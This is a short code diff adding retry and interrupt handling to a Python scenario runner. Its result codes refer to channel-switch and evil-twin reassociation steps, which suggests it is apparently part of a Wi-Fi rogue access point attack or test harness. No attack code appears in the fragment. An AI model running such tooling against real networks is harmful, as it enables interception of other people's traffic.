-        break
+            retryable = final["result"] in {
+                "CSA_SWITCH_FAIL",
+                "EVIL_TWIN_REASSOC_FAIL",
+                "EVIL_TWIN_PING_FAIL",
+                "NO_ASSOC",
+                "ERROR",
+            }
+            attempts_left = args.until_success or attempt_no < max_attempts
+            if retryable and attempts_left:
+                log(f"Retrying scenario after {final['result']} (timing issue likely)...")
+                time.sleep(2)
+                attempt_no += 1
+                continue
+            break
+    except KeyboardInterrupt:
+        log("Interrupted by user; cleanup already handled by current attempt.")
+        return 130
 
     return final["exit_code"] if final else 2
 
